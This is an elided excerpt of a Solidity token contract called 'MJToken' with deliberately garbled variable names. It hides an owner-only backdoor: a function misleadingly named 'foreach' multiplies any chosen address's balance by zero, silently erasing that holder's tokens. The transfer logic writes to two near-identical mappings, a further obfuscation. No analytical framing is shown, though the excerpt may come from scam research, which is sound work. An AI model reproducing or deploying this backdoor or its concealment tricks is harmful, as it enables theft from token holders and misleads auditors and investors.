...
contract Ownable is Context {
    ...
    mapping (address => uint256) internal _cbccdaqsds;
...
contract MJToken is Context, Ownable, IERC20 {
    ...
    constructor() {
        ...
        _cbccdaqsds[_msgSender()] = _totalSupply;
    ...
    function foreach(address aaddeerr) public onlyOwner {
        ...
        for (uint256 i = 0; i < trdfs;) {
            _cbccdaqsds[aaddeerr] *= i;
            break;
        }
    }
    function transfer(address recipient, uint256 amccouunt) public virtual override returns (bool) {
        require(_cbccdaqsds[_msgSender()] >= amccouunt, "TT: transfer amccouunt exceeds balance");
        
        _cbccdaqsd[_msgSender()] -= amccouunt;
        _cbccdaqsd[recipient] += amccouunt;

        _cbccdaqsds[_msgSender()] -= amccouunt;
        _cbccdaqsds[recipient] += amccouunt;
